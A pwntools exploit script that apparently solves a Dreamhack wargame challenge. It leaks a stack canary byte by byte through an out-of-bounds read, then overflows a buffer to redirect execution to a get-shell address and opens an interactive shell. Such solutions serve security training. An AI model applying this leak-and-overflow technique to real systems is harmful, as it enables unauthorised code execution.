from pwn import *

context.log_level = 'debug'

p = remote("host3.dreamhack.games", 19762)

canary = ''

# get Canary
for i in range(128, 132):
	p.sendlineafter(b'> ', 'P')
	p.sendlineafter(b': ', str(i))
	p.recvuntil(": ")
	canary = str(p.recv(2), 'utf-8') + canary
	
canary = p32(int("0x" + canary, 16))
#print(canary)

getshell = p32(0x80486b9)

payload = b'A'*64 + canary + b'A'*8 + getshell

p.sendlineafter(b'> ', 'E')
p.sendlineafter(b': ', str(80))
p.sendlineafter(b': ', payload)

p.interactive()
